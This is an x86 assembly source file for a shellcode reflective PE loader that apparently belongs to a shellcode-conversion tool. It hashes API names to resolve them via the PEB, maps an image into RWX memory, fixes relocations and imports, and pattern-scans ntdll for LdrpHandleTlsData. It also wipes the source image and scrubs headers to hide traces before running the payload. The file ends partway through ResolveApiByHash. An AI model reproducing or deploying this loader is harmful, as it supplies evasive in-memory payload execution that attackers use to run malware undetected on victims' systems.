;----------------------------------------------------------------------------------
; Author: oneday
; Language: MASM x86
; Details:
;   Post-style SRDI loader core for PE32.
;
; Calling convention:
;   ECX = pointer to RDI2 payload header.
;
; Final shellcode layout is produced by the Convert2Shellcode converter API:
;   [x86 post bootstrap][RDI2 header][raw PE][optional user data][this .text]
;----------------------------------------------------------------------------------

.386
.model flat, stdcall
option casemap:none

.code
assume fs:nothing

HDR_MAGIC          equ 00h
HDR_VERSION        equ 04h
HDR_FLAGS          equ 06h
HDR_PE_OFFSET      equ 08h
HDR_PE_SIZE        equ 0Ch
HDR_USER_OFFSET    equ 10h
HDR_USER_SIZE      equ 14h
HDR_EXPORT_HASH    equ 18h

RDI2_MAGIC         equ 32494452h
RDI_FLAG_EXPORT    equ 0001h            ; call DLL export after DLL_PROCESS_ATTACH

CTX_HEADER         equ 004h
CTX_SRC_BASE       equ 008h
CTX_SRC_SIZE       equ 00Ch
CTX_DST_BASE       equ 010h
CTX_SRC_NT         equ 014h
CTX_DST_NT         equ 018h
CTX_DELTA          equ 01Ch
CTX_USER_PTR       equ 020h
CTX_USER_LEN       equ 024h
CTX_FLAGS          equ 028h
CTX_EXPORT_HASH    equ 02Ch
CTX_OLD_PROTECT    equ 030h
CTX_TMP            equ 034h
CTX_ENTRY          equ 038h             ; saved OEP/DllMain during header scrub
CTX_API_VA         equ 040h
CTX_API_VP         equ 044h
CTX_API_LL         equ 048h
CTX_API_GPA        equ 04Ch
CTX_API_FIC        equ 050h
CTX_NTDLL_BASE     equ 05Ch
CTX_API_RGV        equ 060h             ; RtlGetVersion
CTX_WIN_BUILD      equ 064h
CTX_LDRP_TLS       equ 068h
CTX_PATTERN_LEN    equ 06Ch
CTX_PATTERN_BACK   equ 070h
CTX_PATTERN_ABI    equ 074h             ; 0 stdcall, 1 thiscall
CTX_PATTERN_BUF    equ 098h             ; 16 bytes (kept clear of ABI/back/len)
CTX_TEXT_BASE      equ 088h
CTX_TEXT_SIZE      equ 08Ch
CTX_PATTERN_END    equ 090h             ; last possible pattern address
CTX_VERSION_BUF    equ 1B0h             ; OSVERSIONINFOEXW (0x11C bytes)
CTX_FAKE_LDR       equ 3F0h             ; minimal x86 LDR_DATA_TABLE_ENTRY
CTX_SIZE           equ 510h

HASH_VirtualAlloc  equ 0FBFA86AFh
HASH_VirtualProtect equ 0E3918276h
HASH_LoadLibraryA  equ 056590AE9h
HASH_GetProcAddress equ 0E658B905h
HASH_FlushInstructionCache equ 0BD5CC5DBh
HASH_RtlGetVersion equ 0DBBEEF9h
HASH_NTDLL_MODULE  equ 03CFA685Dh

BUILD_WIN7         equ 7600
BUILD_WIN8         equ 9200
BUILD_WIN81        equ 9600
BUILD_WIN10_RS2    equ 15063
BUILD_WIN10_RS4    equ 17134
BUILD_WIN10_RS5    equ 17763
BUILD_WIN10_19H1   equ 18362
BUILD_WIN10_20H1   equ 19041

public RdiMain

RdiMain proc
    cld
    push ebp
    mov  ebp, esp
    sub  esp, CTX_SIZE

    mov  [ebp - CTX_HEADER], ecx
    cmp  dword ptr [ecx + HDR_MAGIC], RDI2_MAGIC
    jne  RdiExit
    cmp  word ptr [ecx + HDR_VERSION], 2
    jne  RdiExit

    mov  eax, [ecx + HDR_PE_OFFSET]
    add  eax, ecx
    mov  [ebp - CTX_SRC_BASE], eax

    mov  eax, [ecx + HDR_PE_SIZE]
    mov  [ebp - CTX_SRC_SIZE], eax

    xor  eax, eax
    mov  edx, [ecx + HDR_USER_OFFSET]
    test edx, edx
    jz   Init_UserDone
    lea  eax, [ecx + edx]
Init_UserDone:
    mov  [ebp - CTX_USER_PTR], eax

    mov  eax, [ecx + HDR_USER_SIZE]
    mov  [ebp - CTX_USER_LEN], eax

    movzx eax, word ptr [ecx + HDR_FLAGS]
    mov  [ebp - CTX_FLAGS], eax

    mov  eax, [ecx + HDR_EXPORT_HASH]
    mov  [ebp - CTX_EXPORT_HASH], eax

    mov  edx, [ebp - CTX_SRC_BASE]
    cmp  word ptr [edx], 5A4Dh
    jne  RdiExit
    mov  eax, [edx + 3Ch]
    add  eax, edx
    cmp  dword ptr [eax], 00004550h
    jne  RdiExit
    cmp  word ptr [eax + 18h], 010Bh
    jne  RdiExit
    mov  [ebp - CTX_SRC_NT], eax

    call ResolveCoreApis
    test eax, eax
    jz   RdiExit

    call MapImage
    test eax, eax
    jz   RdiExit

    call ApplyRelocations
    test eax, eax
    jz   RdiExit

    call ResolveImports
    test eax, eax
    jz   RdiExit

    call TryLdrpHandleTlsData
    call RunTlsCallbacks
    call ProtectSections
    call ClearSourcePe
    call FlushInstructionCache
    call CallImageEntry

RdiExit:
    mov  esp, ebp
    pop  ebp
    ret
RdiMain endp

;----------------------------------------------------------------------------------
; Shared null-terminated ANSI string ROR13 hash helper.
; Input:  ESI = string pointer
; Output: EDI = hash
; Clobbers: EAX, ESI
;----------------------------------------------------------------------------------
Ror13HashNTStr proc
    xor  edi, edi
Ror13NT_Loop:
    xor  eax, eax
    lodsb
    test al, al
    jz   Ror13NT_Done
    ror  edi, 0Dh
    add  edi, eax
    jmp  Ror13NT_Loop
Ror13NT_Done:
    ret
Ror13HashNTStr endp

ResolveCoreApis proc
    mov  eax, HASH_VirtualAlloc
    call ResolveApiByHash
    test eax, eax
    jz   ResolveCoreApis_Fail
    mov  [ebp - CTX_API_VA], eax

    mov  eax, HASH_VirtualProtect
    call ResolveApiByHash
    test eax, eax
    jz   ResolveCoreApis_Fail
    mov  [ebp - CTX_API_VP], eax

    mov  eax, HASH_LoadLibraryA
    call ResolveApiByHash
    test eax, eax
    jz   ResolveCoreApis_Fail
    mov  [ebp - CTX_API_LL], eax

    mov  eax, HASH_GetProcAddress
    call ResolveApiByHash
    test eax, eax
    jz   ResolveCoreApis_Fail
    mov  [ebp - CTX_API_GPA], eax

    mov  eax, HASH_FlushInstructionCache
    call ResolveApiByHash
    mov  [ebp - CTX_API_FIC], eax

    mov  eax, HASH_RtlGetVersion
    call ResolveApiByHash
    mov  [ebp - CTX_API_RGV], eax

    mov  eax, 1
    ret

ResolveCoreApis_Fail:
    xor  eax, eax
    ret
ResolveCoreApis endp

MapImage proc
    mov  ebx, [ebp - CTX_SRC_NT]

    xor  eax, eax
    mov  ecx, [ebx + 0A0h]               ; Base relocation RVA
    or   ecx, [ebx + 0A4h]               ; Base relocation size
    jnz  MapImage_Allocate
    mov  eax, [ebx + 34h]                ; non-relocatable: require ImageBase
MapImage_Allocate:
    push 40h                             ; PAGE_EXECUTE_READWRITE
    push 3000h                           ; MEM_COMMIT | MEM_RESERVE
    push dword ptr [ebx + 50h]           ; SizeOfImage
    push eax
    call dword ptr [ebp - CTX_API_VA]
    test eax, eax
    jz   MapImage_Fail
    mov  [ebp - CTX_DST_BASE], eax

    mov  ecx, [ebx + 54h]                ; SizeOfHeaders
    mov  esi, [ebp - CTX_SRC_BASE]
    mov  edi, [ebp - CTX_DST_BASE]
    rep  movsb

    mov  edx, [ebp - CTX_DST_BASE]
    mov  eax, [edx + 3Ch]
    add  eax, edx
    mov  [ebp - CTX_DST_NT], eax

    movzx eax, word ptr [eax + 14h]
    mov  edx, [ebp - CTX_DST_NT]
    lea  esi, [edx + eax + 18h]          ; first section
    movzx ebx, word ptr [edx + 6]        ; NumberOfSections

MapImage_NextSection:
    test ebx, ebx
    jz   MapImage_Done

    mov  ecx, [esi + 10h]                ; SizeOfRawData
    test ecx, ecx
    jz   MapImage_Advance

    mov  eax, [esi + 14h]                ; PointerToRawData
    test eax, eax
    jz   MapImage_Advance

    mov  edx, [esi + 0Ch]                ; VirtualAddress
    add  edx, [ebp - CTX_DST_BASE]
    mov  edi, edx
    mov  edx, [ebp - CTX_SRC_BASE]
    add  edx, eax
    mov  esi, esi
    push esi
    mov  esi, edx
    rep  movsb
    pop  esi

MapImage_Advance:
    add  esi, 28h
    dec  ebx
    jmp  MapImage_NextSection

MapImage_Done:
    mov  eax, [ebp - CTX_DST_BASE]
    mov  edx, [ebp - CTX_DST_NT]
    sub  eax, [edx + 34h]                ; ImageBase
    mov  [ebp - CTX_DELTA], eax
    mov  eax, 1
    ret

MapImage_Fail:
    xor  eax, eax
    ret
MapImage endp

ApplyRelocations proc
    mov  eax, [ebp - CTX_DELTA]
    test eax, eax
    jz   Reloc_Success

    mov  ebx, [ebp - CTX_DST_NT]
    mov  esi, [ebx + 0A0h]               ; Base relocation RVA
    mov  ecx, [ebx + 0A4h]               ; Base relocation size
    test esi, esi
    jz   Reloc_Success
    test ecx, ecx
    jz   Reloc_Success

    add  esi, [ebp - CTX_DST_BASE]
    add  ecx, esi                        ; end

Reloc_Block:
    cmp  esi, ecx
    jae  Reloc_Success
    mov  edx, [esi + 4]                  ; SizeOfBlock
    cmp  edx, 8
    jb   Reloc_Fail

    mov  ebx, edx
    sub  ebx, 8
    shr  ebx, 1                          ; entry count
    lea  edi, [esi + 8]

Reloc_Entry:
    test ebx, ebx
    jz   Reloc_NextBlock

    movzx eax, word ptr [edi]
    mov  edx, eax
    shr  edx, 12
    and  eax, 0FFFh
    cmp  edx, 3                          ; IMAGE_REL_BASED_HIGHLOW
    je   Reloc_HighLow
    cmp  edx, 0                          ; IMAGE_REL_BASED_ABSOLUTE
    je   Reloc_AdvanceEntry
    jmp  Reloc_AdvanceEntry

Reloc_HighLow:
    add  eax, [esi]                      ; VirtualAddress + offset
    add  eax, [ebp - CTX_DST_BASE]
    mov  edx, [ebp - CTX_DELTA]
    add  [eax], edx

Reloc_AdvanceEntry:
    add  edi, 2
    dec  ebx
    jmp  Reloc_Entry

Reloc_NextBlock:
    add  esi, [esi + 4]
    jmp  Reloc_Block

Reloc_Success:
    mov  eax, 1
    ret

Reloc_Fail:
    xor  eax, eax
    ret
ApplyRelocations endp

ResolveImports proc
    mov  ebx, [ebp - CTX_DST_NT]
    mov  esi, [ebx + 80h]                ; Import directory RVA
    mov  ecx, [ebx + 84h]                ; Import directory size
    test esi, esi
    jz   Imports_Done
    test ecx, ecx
    jz   Imports_Done
    add  esi, [ebp - CTX_DST_BASE]

Imports_NextDll:
    cmp  dword ptr [esi + 0Ch], 0        ; Name RVA
    je   Imports_Done

    mov  eax, [esi + 0Ch]
    add  eax, [ebp - CTX_DST_BASE]
    push eax
    call dword ptr [ebp - CTX_API_LL]
    test eax, eax
    jz   Imports_Fail
    mov  ebx, eax                        ; module

    mov  edx, [esi]                      ; OriginalFirstThunk
    test edx, edx
    jnz  Imports_HaveLookup
    mov  edx, [esi + 10h]                ; FirstThunk fallback

Imports_HaveLookup:
    add  edx, [ebp - CTX_DST_BASE]       ; lookup thunk
    mov  edi, [esi + 10h]
    add  edi, [ebp - CTX_DST_BASE]       ; IAT thunk

Imports_NextThunk:
    cmp  dword ptr [edx], 0
    je   Imports_AdvanceDll

    mov  eax, [edx]
    test eax, 80000000h
    jnz  Imports_ByOrdinal

Imports_ByName:
    add  eax, [ebp - CTX_DST_BASE]
    add  eax, 2                          ; skip Hint
    push edx
    push edi
    push eax
    push ebx
    call dword ptr [ebp - CTX_API_GPA]
    pop  edi
    pop  edx
    jmp  Imports_WriteIat

Imports_ByOrdinal:
    and  eax, 0FFFFh
    push edx
    push edi
    push eax
    push ebx
    call dword ptr [ebp - CTX_API_GPA]
    pop  edi
    pop  edx

Imports_WriteIat:
    test eax, eax
    jz   Imports_Fail
    mov  [edi], eax
    add  edx, 4
    add  edi, 4
    jmp  Imports_NextThunk

Imports_AdvanceDll:
    add  esi, 14h
    jmp  Imports_NextDll

Imports_Done:
    mov  eax, 1
    ret

Imports_Fail:
    xor  eax, eax
    ret
ResolveImports endp

;----------------------------------------------------------------------------------
; System TLS path for PE32. Locate ntdll!LdrpHandleTlsData by build-specific
; signature, call it with a minimal fake LDR entry, then keep the system TLS
; allocation alive. Returns EAX=1 on success, EAX=0 on failure.
;----------------------------------------------------------------------------------
TryLdrpHandleTlsData proc
    mov  eax, [ebp - CTX_DST_NT]
    mov  edx, [eax + 0C0h]               ; TLS directory RVA
    mov  ecx, [eax + 0C4h]               ; TLS directory size
    test edx, edx
    jz   TryLdrp_Success
    test ecx, ecx
    jz   TryLdrp_Success

    mov  eax, HASH_NTDLL_MODULE
    call FindModuleBaseByHash
    test eax, eax
    jz   TryLdrp_Fail
    mov  [ebp - CTX_NTDLL_BASE], eax

    mov  eax, [ebp - CTX_API_RGV]
    test eax, eax
    jz   TryLdrp_Fail

    lea  edi, [ebp - CTX_VERSION_BUF]
    xor  eax, eax
    mov  ecx, 47h                        ; sizeof(OSVERSIONINFOEXW) / sizeof(DWORD)
    rep  stosd
    lea  eax, [ebp - CTX_VERSION_BUF]
    mov  dword ptr [eax], 11Ch
    push eax
    call dword ptr [ebp - CTX_API_RGV]
    test eax, eax
    js   TryLdrp_Fail

    mov  eax, [ebp - CTX_VERSION_BUF + 0Ch]
    mov  [ebp - CTX_WIN_BUILD], eax
    call SelectLdrpTlsPatternX86
    test eax, eax
    jz   TryLdrp_Fail

    mov  eax, [ebp - CTX_NTDLL_BASE]
    call FindTextSectionX86
    test eax, eax
    jz   TryLdrp_Fail
    test edx, edx
    jz   TryLdrp_Fail
    mov  [ebp - CTX_TEXT_BASE], eax
    mov  [ebp - CTX_TEXT_SIZE], edx

    call FindLdrpHandleTlsDataX86
    test eax, eax
    jz   TryLdrp_Fail
    mov  [ebp - CTX_LDRP_TLS], eax

    lea  edi, [ebp - CTX_FAKE_LDR]
    xor  eax, eax
    mov  ecx, 48h                        ; 0x120-byte fake LDR entry
    rep  stosd
    mov  eax, [ebp - CTX_DST_BASE]
    mov  [ebp - CTX_FAKE_LDR + 18h], eax ; x86 LDR_DATA_TABLE_ENTRY.DllBase

    cmp  dword ptr [ebp - CTX_PATTERN_ABI], 1
    je   TryLdrp_Thiscall

    lea  eax, [ebp - CTX_FAKE_LDR]
    push eax                              ; Win7/Win8: stdcall(LdrDataTableEntry)
    mov  eax, [ebp - CTX_LDRP_TLS]
    call eax
    jmp  TryLdrp_CheckStatus

TryLdrp_Thiscall:
    lea  ecx, [ebp - CTX_FAKE_LDR]       ; Win8.1+: thiscall, ECX is the entry
    mov  eax, [ebp - CTX_LDRP_TLS]
    call eax

TryLdrp_CheckStatus:
    test eax, eax
    js   TryLdrp_Fail

    ; AddressOfIndex is optional, but when present must point into the image.
    mov  eax, [ebp - CTX_DST_NT]
    mov  edx, [eax + 0C0h]
    add  edx, [ebp - CTX_DST_BASE]
    mov  edx, [edx + 08h]                ; IMAGE_TLS_DIRECTORY32.AddressOfIndex
    test edx, edx
    jz   TryLdrp_Success
    mov  ecx, [ebp - CTX_DST_BASE]
    cmp  edx, ecx
    jb   TryLdrp_Fail
    sub  edx, ecx
    mov  eax, [ebp - CTX_DST_NT]
    mov  eax, [eax + 50h]                ; SizeOfImage
    cmp  eax, 4
    jb   TryLdrp_Fail
    sub  eax, 4
    cmp  edx, eax
    ja   TryLdrp_Fail

TryLdrp_Success:
    mov  eax, 1
    ret

TryLdrp_Fail:
    xor  eax, eax
    ret
TryLdrpHandleTlsData endp

; Input EAX = module ROR13 hash. Output EAX = module DllBase or 0.
FindModuleBaseByHash proc
    mov  [ebp - CTX_TMP], eax
    xor  edx, edx
    mov  edx, fs:[edx + 30h]             ; PEB
    mov  edx, [edx + 0Ch]                ; PEB->Ldr
    lea  ecx, [edx + 14h]                ; InMemoryOrderModuleList head
    mov  edx, [ecx]

FindMod_Next:
    cmp  edx, ecx
    je   FindMod_Fail
    mov  esi, [edx + 28h]                ; BaseDllName.Buffer
    movzx ebx, word ptr [edx + 24h]      ; BaseDllName.Length
    test ebx, ebx
    jz   FindMod_Advance
    xor  edi, edi

FindMod_Hash:
    xor  eax, eax
    lodsb
    cmp  al, 'a'
    jl   FindMod_Char
    sub  al, 20h
FindMod_Char:
    ror  edi, 0Dh
    add  edi, eax
    dec  ebx
    jnz  FindMod_Hash
    cmp  edi, [ebp - CTX_TMP]
    jne  FindMod_Advance
    mov  eax, [edx + 10h]                ; DllBase relative to InMemoryOrderLinks
    ret

FindMod_Advance:
    mov  edx, [edx]
    jmp  FindMod_Next

FindMod_Fail:
    xor  eax, eax
    ret
FindModuleBaseByHash endp

; Input EAX = PE base. Output EAX = .text VA, EDX = VirtualSize, or both zero.
FindTextSectionX86 proc
    push ebx
    push esi
    push ecx
    mov  ebx, eax
    mov  eax, [ebx + 3Ch]
    add  eax, ebx
    cmp  dword ptr [eax], 00004550h
    jne  FindText_Fail
    movzx ecx, word ptr [eax + 14h]
    lea  esi, [eax + ecx + 18h]
    movzx ecx, word ptr [eax + 6]

FindText_Next:
    test ecx, ecx
    jz   FindText_Fail
    cmp  dword ptr [esi], 7865742Eh      ; ".tex"
    jne  FindText_Advance
    cmp  byte ptr [esi + 4], 074h        ; "t"
    jne  FindText_Advance
    mov  eax, [esi + 0Ch]
    add  eax, ebx
    mov  edx, [esi + 8]
    jmp  FindText_Done

FindText_Advance:
    add  esi, 28h
    dec  ecx
    jmp  FindText_Next

FindText_Fail:
    xor  eax, eax
    xor  edx, edx

FindText_Done:
    pop  ecx
    pop  esi
    pop  ebx
    ret
FindTextSectionX86 endp

; Select the C loader's x86 signature table. EAX=1 on success.
SelectLdrpTlsPatternX86 proc
    mov  eax, [ebp - CTX_WIN_BUILD]
    cmp  eax, BUILD_WIN10_20H1
    jae  Pattern_Win10_20H1
    cmp  eax, BUILD_WIN10_19H1
    jae  Pattern_Win10_19H1
    cmp  eax, BUILD_WIN10_RS5
    jae  Pattern_Win10_RS5
    cmp  eax, BUILD_WIN10_RS4
    jae  Pattern_Win10_RS4
    cmp  eax, BUILD_WIN10_RS2
    jae  Pattern_Win10_RS2
    cmp  eax, BUILD_WIN81
    jae  Pattern_Win81
    cmp  eax, BUILD_WIN8
    jae  Pattern_Win8
    cmp  eax, BUILD_WIN7
    jae  Pattern_Win7
    xor  eax, eax
    ret

Pattern_Win10_20H1:
    mov  dword ptr [ebp - CTX_PATTERN_BUF], 0C085F633h
    mov  word ptr [ebp - CTX_PATTERN_BUF + 4], 0379h
    mov  dword ptr [ebp - CTX_PATTERN_LEN], 6
    mov  dword ptr [ebp - CTX_PATTERN_BACK], 02Ch
    jmp  Pattern_Thiscall
Pattern_Win10_19H1:
    mov  dword ptr [ebp - CTX_PATTERN_BUF], 0C085F633h
    mov  word ptr [ebp - CTX_PATTERN_BUF + 4], 0379h
    mov  dword ptr [ebp - CTX_PATTERN_LEN], 6
    mov  dword ptr [ebp - CTX_PATTERN_BACK], 02Eh
    jmp  Pattern_Thiscall
Pattern_Win10_RS5:
    mov  dword ptr [ebp - CTX_PATTERN_BUF], 0C085F633h
    mov  word ptr [ebp - CTX_PATTERN_BUF + 4], 0379h
    mov  dword ptr [ebp - CTX_PATTERN_LEN], 6
    mov  dword ptr [ebp - CTX_PATTERN_BACK], 02Ch
    jmp  Pattern_Thiscall
Pattern_Win10_RS4:
    mov  dword ptr [ebp - CTX_PATTERN_BUF], 04D8DC18Bh
    mov  word ptr [ebp - CTX_PATTERN_BUF + 4], 051ACh
    mov  dword ptr [ebp - CTX_PATTERN_LEN], 6
    mov  dword ptr [ebp - CTX_PATTERN_BACK], 018h
    jmp  Pattern_Thiscall
Pattern_Win10_RS2:
    mov  dword ptr [ebp - CTX_PATTERN_BUF], 04D8DC18Bh
    mov  word ptr [ebp - CTX_PATTERN_BUF + 4], 05108h
    mov  dword ptr [ebp - CTX_PATTERN_LEN], 6
    mov  dword ptr [ebp - CTX_PATTERN_BACK], 018h
    jmp  Pattern_Thiscall
Pattern_Win81:
    mov  dword ptr [ebp - CTX_PATTERN_BUF], 06A096A50h
    mov  word ptr [ebp - CTX_PATTERN_BUF + 4], 08B01h
    mov  byte ptr [ebp - CTX_PATTERN_BUF + 6], 0C1h
    mov  dword ptr [ebp - CTX_PATTERN_LEN], 7
    mov  dword ptr [ebp - CTX_PATTERN_BACK], 01Bh
    jmp  Pattern_Thiscall
Pattern_Win8:
    mov  dword ptr [ebp - CTX_PATTERN_BUF], 08908458Bh
    mov  word ptr [ebp - CTX_PATTERN_BUF + 4], 0A045h
    mov  dword ptr [ebp - CTX_PATTERN_LEN], 6
    mov  dword ptr [ebp - CTX_PATTERN_BACK], 00Ch
    jmp  Pattern_Stdcall
Pattern_Win7:
    mov  dword ptr [ebp - CTX_PATTERN_BUF], 0458D2074h
    mov  dword ptr [ebp - CTX_PATTERN_BUF + 4], 096A50D4h
    mov  dword ptr [ebp - CTX_PATTERN_LEN], 8
    mov  dword ptr [ebp - CTX_PATTERN_BACK], 014h
    jmp  Pattern_Stdcall

Pattern_Thiscall:
    mov  dword ptr [ebp - CTX_PATTERN_ABI], 1
    mov  eax, 1
    ret
Pattern_Stdcall:
    mov  dword ptr [ebp - CTX_PATTERN_ABI], 0
    mov  eax, 1
    ret
SelectLdrpTlsPatternX86 endp

; Find a valid function boundary for an x86 LdrpHandleTlsData signature.
; Output EAX = function entry or 0.
FindLdrpHandleTlsDataX86 proc
    mov  eax, [ebp - CTX_TEXT_SIZE]
    mov  ecx, [ebp - CTX_PATTERN_LEN]
    cmp  eax, ecx
    jb   FindLdrp_Fail
    mov  esi, [ebp - CTX_TEXT_BASE]
    mov  edi, esi
    add  edi, eax
    sub  edi, ecx                         ; final candidate address
    mov  [ebp - CTX_PATTERN_END], edi

FindLdrp_Next:
    cmp  esi, [ebp - CTX_PATTERN_END]
    ja   FindLdrp_Fail
    mov  [ebp - CTX_TMP], esi            ; preserve candidate across compare
    mov  edx, esi
    lea  edi, [ebp - CTX_PATTERN_BUF]
    mov  ecx, [ebp - CTX_PATTERN_LEN]
FindLdrp_Compare:
    test ecx, ecx
    jz   FindLdrp_Match
    mov  al, [edx]
    cmp  al, [edi]
    jne  FindLdrp_Advance
    inc  edx
    inc  edi
    dec  ecx
    jmp  FindLdrp_Compare
FindLdrp_Match:
    mov  eax, [ebp - CTX_TMP]
    call FindFunctionStartCCX86
    test eax, eax
    jnz  FindLdrp_Done
    mov  esi, [ebp - CTX_TMP]

FindLdrp_Advance:
    mov  esi, [ebp - CTX_TMP]
    inc  esi
    jmp  FindLdrp_Next

FindLdrp_Fail:
    xor  eax, eax
FindLdrp_Done:
    ret
FindLdrpHandleTlsDataX86 endp

; Input EAX = signature address. Output EAX = containing function entry or 0.
FindFunctionStartCCX86 proc
    mov  edx, eax                         ; preserve match address
    sub  eax, [ebp - CTX_PATTERN_BACK]
    jc   FindStart_Fail
    mov  ecx, [ebp - CTX_TEXT_BASE]
    cmp  eax, ecx
    jb   FindStart_Fail

FindStart_Backward:
    lea  ebx, [ecx + 2]
    cmp  eax, ebx
    jb   FindStart_Fail
    mov  bl, byte ptr [eax]
    cmp  bl, 0CCh
    jne  FindStart_CheckNop
    cmp  byte ptr [eax + 1], 0CCh
    je   FindStart_Padding
    jmp  FindStart_Dec
FindStart_CheckNop:
    cmp  bl, 090h
    jne  FindStart_Dec
    cmp  byte ptr [eax + 1], 090h
    je   FindStart_Padding
FindStart_Dec:
    dec  eax
    jmp  FindStart_Backward

FindStart_Padding:
    add  eax, 2
    mov  ecx, [ebp - CTX_TEXT_BASE]
    add  ecx, [ebp - CTX_TEXT_SIZE]

FindStart_SkipPadding:
    cmp  eax, ecx
    jae  FindStart_Check
    mov  bl, byte ptr [eax]
    cmp  bl, 0CCh
    je   FindStart_Advance
    cmp  bl, 090h
    jne  FindStart_Check
FindStart_Advance:
    inc  eax
    jmp  FindStart_SkipPadding

FindStart_Check:
    cmp  eax, edx
    ja   FindStart_Fail
    ret

FindStart_Fail:
    xor  eax, eax
    ret
FindFunctionStartCCX86 endp

RunTlsCallbacks proc
    mov  eax, [ebp - CTX_DST_NT]
    mov  esi, [eax + 0C0h]               ; TLS directory RVA
    mov  ecx, [eax + 0C4h]               ; TLS directory size
    test esi, esi
    jz   Tls_Done
    test ecx, ecx
    jz   Tls_Done
    add  esi, [ebp - CTX_DST_BASE]

    mov  edi, [esi + 0Ch]                ; AddressOfCallBacks VA
    test edi, edi
    jz   Tls_Done

Tls_Next:
    mov  eax, [edi]
    test eax, eax
    jz   Tls_Done

    push 0
    push 1
    push dword ptr [ebp - CTX_DST_BASE]
    call eax

    add  edi, 4
    jmp  Tls_Next

Tls_Done:
    ret
RunTlsCallbacks endp

ProtectSections proc
    mov  ebx, [ebp - CTX_DST_NT]
    movzx eax, word ptr [ebx + 14h]
    lea  esi, [ebx + eax + 18h]
    movzx ebx, word ptr [ebx + 6]

Protect_NextSection:
    test ebx, ebx
    jz   Protect_Done

    mov  edx, [esi + 8]                  ; VirtualSize
    mov  eax, [esi + 10h]                ; SizeOfRawData
    cmp  edx, eax
    jae  Protect_HaveSize
    mov  edx, eax

Protect_HaveSize:
    test edx, edx
    jz   Protect_Advance

    mov  eax, [esi + 24h]                ; Characteristics
    and  eax, 0E0000000h
    shr  eax, 29
    call Protect_GetValue
Protect_Table:
    db 01h, 10h, 02h, 20h, 08h, 80h, 04h, 40h

Protect_GetValue:
    pop  ecx
    movzx eax, byte ptr [ecx + eax]

    lea  ecx, [ebp - CTX_OLD_PROTECT]
    push ecx
    push eax
    push edx
    mov  eax, [esi + 0Ch]
    add  eax, [ebp - CTX_DST_BASE]
    push eax
    call dword ptr [ebp - CTX_API_VP]

Protect_Advance:
    add  esi, 28h
    dec  ebx
    jmp  Protect_NextSection

Protect_Done:
    ret
ProtectSections endp

ClearSourcePe proc
    mov  edi, [ebp - CTX_SRC_BASE]
    mov  ecx, [ebp - CTX_SRC_SIZE]
    xor  eax, eax
    rep  stosb
    ret
ClearSourcePe endp

ScrubMappedPeHeaders proc
    mov  ebx, [ebp - CTX_DST_NT]
    mov  ecx, [ebx + 54h]                ; SizeOfHeaders
    test ecx, ecx
    jz   ScrubMappedPeHeaders_Done

    mov  edi, [ebp - CTX_DST_BASE]
    xor  eax, eax
    rep  stosb

    lea  eax, [ebp - CTX_OLD_PROTECT]
    push eax                             ; lpflOldProtect
    push 02h                             ; PAGE_READONLY
    push dword ptr [ebx + 54h]           ; SizeOfHeaders
    push dword ptr [ebp - CTX_DST_BASE]  ; base address
    call dword ptr [ebp - CTX_API_VP]

ScrubMappedPeHeaders_Done:
    ret
ScrubMappedPeHeaders endp

FlushInstructionCache proc
    mov  eax, [ebp - CTX_API_FIC]
    test eax, eax
    jz   Flush_Done
    push 0
    push 0
    push -1
    call eax
Flush_Done:
    ret
FlushInstructionCache endp

CallImageEntry proc
    mov  esi, [ebp - CTX_DST_NT]
    mov  edx, [ebp - CTX_FLAGS]
    test dx, RDI_FLAG_EXPORT
    jz   Entry_Default
    mov  eax, [ebp - CTX_EXPORT_HASH]
    test eax, eax
    jz   Entry_Default
    test word ptr [esi + 16h], 2000h     ; requested exports are DLL-only
    jz   Entry_Export_Fail

    mov  ebx, [esi + 28h]                ; AddressOfEntryPoint
    add  ebx, [ebp - CTX_DST_BASE]
    mov  [ebp - CTX_ENTRY], ebx
    call ResolveExportByHash
    test eax, eax
    jz   Entry_Export_Fail

    mov  [ebp - CTX_TMP], eax
    call ScrubMappedPeHeaders
    mov  ebx, [ebp - CTX_ENTRY]
    push 0
    push 1
    push dword ptr [ebp - CTX_DST_BASE]
    call ebx
    test eax, eax
    jz   Entry_Export_Fail

    mov  eax, [ebp - CTX_TMP]
    push dword ptr [ebp - CTX_USER_LEN]
    push dword ptr [ebp - CTX_USER_PTR]
    push dword ptr [ebp - CTX_DST_BASE]
    call eax
    add  esp, 0Ch
    ret

Entry_Export_Fail:
    xor  eax, eax
    ret

Entry_Default:
    mov  ax, word ptr [esi + 16h]         ; FileHeader.Characteristics
    test ax, 2000h                        ; IMAGE_FILE_DLL
    jz   Entry_Exe

Entry_Dll:
    mov  ebx, [esi + 28h]                 ; AddressOfEntryPoint
    add  ebx, [ebp - CTX_DST_BASE]
    mov  [ebp - CTX_TMP], ebx
    call ScrubMappedPeHeaders
    mov  ebx, [ebp - CTX_TMP]
    push 0
    push 1
    push dword ptr [ebp - CTX_DST_BASE]
    call ebx
    ret

Entry_Exe:
    mov  ebx, [esi + 28h]                 ; AddressOfEntryPoint
    add  ebx, [ebp - CTX_DST_BASE]
    mov  [ebp - CTX_TMP], ebx
    call ScrubMappedPeHeaders
    mov  ebx, [ebp - CTX_TMP]
    call ebx
    ret
CallImageEntry endp

ResolveExportByHash proc
    mov  ebx, [ebp - CTX_DST_BASE]
    mov  eax, [ebp - CTX_DST_NT]
    mov  edx, [eax + 78h]                ; export RVA
    mov  ecx, [eax + 7Ch]                ; export size
    test edx, edx
    jz   Export_Fail
    test ecx, ecx
    jz   Export_Fail

    add  edx, ebx
    mov  esi, [edx + 20h]                ; AddressOfNames
    add  esi, ebx
    mov  ecx, [edx + 18h]                ; NumberOfNames

Export_NextName:
    test ecx, ecx
    jz   Export_Fail
    dec  ecx

    mov  eax, [esi + ecx * 4]
    add  eax, ebx
    push esi
    push edx
    mov  esi, eax
    call Ror13HashNTStr
    pop  edx
    pop  esi

    cmp  edi, [ebp - CTX_EXPORT_HASH]
    jne  Export_NextName

    mov  eax, [edx + 24h]                ; AddressOfNameOrdinals
    add  eax, ebx
    movzx ecx, word ptr [eax + ecx * 2]
    mov  eax, [edx + 1Ch]                ; AddressOfFunctions
    add  eax, ebx
    mov  eax, [eax + ecx * 4]
    add  eax, ebx
    ret

Export_Fail:
    xor  eax, eax
    ret
ResolveExportByHash endp

ResolveApiByHash proc
    mov  [ebp - CTX_TMP], eax            ; target hash

    xor  edx, edx
    mov  edx, fs:[edx + 30h]             ; PEB
    mov  edx, [edx + 0Ch]                ; PEB->Ldr
    lea  ecx, [edx + 14h]                ; InMemoryOrderModuleList head
    mov  edx, [ecx]

Api_NextModule:
    cmp  edx, ecx
    je   Api_Fail

    mov  esi, [edx + 28h]                ; BaseDllName.Buffer
